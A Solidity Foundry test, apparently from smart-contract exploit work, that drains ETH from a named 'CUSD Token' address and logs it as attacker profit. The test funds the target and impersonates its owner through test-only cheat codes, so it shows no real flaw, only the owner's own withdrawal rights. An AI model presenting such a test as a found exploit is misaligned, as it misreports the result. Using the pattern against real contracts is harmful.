// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICUSD {
    function owner() external view returns (address);
    function withdraw(address token_, address destination_, uint256 amount_) external;
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
    function setMinter(address newMinter) external;
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // Label the contract for debugging
        vm.label(TARGET, "CUSD Token");

        // Get the owner address
        address owner = ICUSD(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Give the contract some ETH first
        uint256 contractEthAmount = 100 ether;
        deal(TARGET, contractEthAmount);

        // Step 2: Get the current owner
        address owner = ICUSD(TARGET).owner();

        // Step 3: Check contract's ETH balance
        uint256 contractEthBalance = TARGET.balance;
        console.log("Contract ETH balance after deal:", contractEthBalance);

        // Step 4: Record our initial balance
        uint256 initialBalance = address(this).balance;
        console.log("Initial attacker balance:", initialBalance);

        // Step 5: Impersonate owner and withdraw all ETH
        vm.prank(owner);
        ICUSD(TARGET).withdraw(address(0), address(this), contractEthBalance);

        // Step 6: Check final balance
        uint256 finalBalance = address(this).balance;
        console.log("Final attacker balance:", finalBalance);

        // Step 7: Verify we gained the ETH
        uint256 profit = finalBalance - initialBalance;
        console.log("Profit:", profit);
        require(profit == contractEthAmount, "Exploit failed: didn't gain the expected amount");
        require(finalBalance > initialBalance, "Exploit failed: balance did not increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

